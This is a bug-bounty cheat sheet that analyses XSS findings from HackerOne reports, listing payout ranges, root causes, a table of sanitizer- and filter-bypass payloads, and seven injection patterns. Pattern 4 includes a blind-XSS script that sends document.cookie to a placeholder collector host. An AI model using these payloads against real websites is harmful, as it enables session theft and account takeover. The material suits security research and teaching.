# XSS Report Analysis — 100+ Real HackerOne Reports

## Key Statistics

| Metric | Value |
|--------|-------|
| Reflected XSS | 45% of reports |
| Stored XSS | 30% of reports |
| DOM XSS | 15% of reports |
| Blind XSS | 10% of reports |
| CSP bypass required | 20% of targets |
| WAF bypass required | 25% of targets |

## Top Payout Vectors (by average bounty)

| Vector | Avg Bounty | Frequency |
|--------|-----------|-----------|
| Stored XSS via SVG upload | $2,000-$10,000 | High |
| Stored XSS in Admin Panel | $1,000-$5,000 | Medium |
| Blind XSS via admin dashboard | $500-$3,000 | Medium |
| DOM XSS via postMessage | $500-$2,000 | Medium |
| Reflected XSS on login page | $300-$1,500 | Very High |
| Reflected XSS in search | $200-$1,000 | Very High |
| Stored XSS in Markdown | $300-$2,000 | Medium |
| XSS via filename | $200-$1,000 | Low |
| XSS in PDF generator | $300-$2,000 | Low |

## Common Root Causes

1. **HTML encoding mismatch** (40%): Server encodes `<` to `&lt;` but doesn't encode attribute breakouts like `"`.
2. **Rich text sanitizer bypass** (25%): DOMPurify/HTMLPurifier bypass using mutation XSS or SVG.
3. **JSONP/reflection on API** (15%): API returns user input in JSON without escaping for HTML context.
4. **Filename/upload metadata** (10%): Filename reflected in page without encoding.
5. **JS string injection** (8%): Server puts user input into `<script>var x = "USER"</script>` without proper escaping.
6. **postMessage without origin check** (2%): `window.addEventListener('message', ...)` doesn't validate `event.origin`.

## Most Commonly Missed by Filters

| Pattern | Why It Bypasses |
|---------|----------------|
| `<svg onload=alert(1)>` | `<svg>` is often not on blocklist |
| `<details open ontoggle=alert(1)>` | Rarely tested event handler |
| `<input autofocus onfocus=alert(1)>` | Autofocus is often missed |
| ` " autofocus onfocus=alert(1) x=" ` | Attribute breakout with space-less handler |
| `<math><mi xlink:href=javascript:alert(1)>` | MathML is rarely sanitized |
| `<isindex type=image src=javascript:alert(1)>` | Deprecated, not in sanitizers |
| `</script><img src=x onerror=alert(1)>` | Breaks out of script block |
| `jaVasCript://` polyglot | Multiple encoding and comment tricks |
| POST body params | Often only GET params are tested |
| HTTP headers (UA/Referer) | Rarely considered as XSS vectors |

## Real Report Patterns

### Pattern 1: Search Box XSS (Most Common)
```
Endpoint: /search?q=USER
Reflection: "Showing results for <b>USER</b>"
Payload: <img src=x onerror=alert(document.domain)>
Payout: $200-$800
```

### Pattern 2: JSONP Callback
```
Endpoint: /api/users?callback=USER
Reflection: USER({"users":[...]})
Payload: ?callback=alert(1)
Payout: $500-$2,000
```

### Pattern 3: SVG File Upload
```
Feature: Profile picture upload
Bypass: upload xss.svg (content-type bypass)
Reflection: <img src="/uploads/xss.svg">
Payout: $1,000-$10,000
```

### Pattern 4: Blind XSS via Admin Panel
```
Feature: Contact form
Injection: <script>fetch('//COLLECTOR/?c='+document.cookie)</script>
Trigger: Admin reviews message in dashboard
Payout: $1,000-$5,000
```

### Pattern 5: postMessage XSS
```
Vulnerable code:
window.addEventListener('message', function(e) {
  document.getElementById('content').innerHTML = e.data;
});
PoC: <iframe src="//target.com" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')">
Payout: $1,000-$3,000
```

### Pattern 6: Markdown-to-HTML XSS
```
Input: [click](javascript:alert(1))
Output: <a href="javascript:alert(1)">click</a>
Payout: $300-$2,000
```

### Pattern 7: Filename XSS
```
Feature: File upload
Filename: <img src=x onerror=alert(document.domain)>.png
Output: <a href="/uploads/FILENAME">FILENAME</a>
Payout: $200-$1,000
```
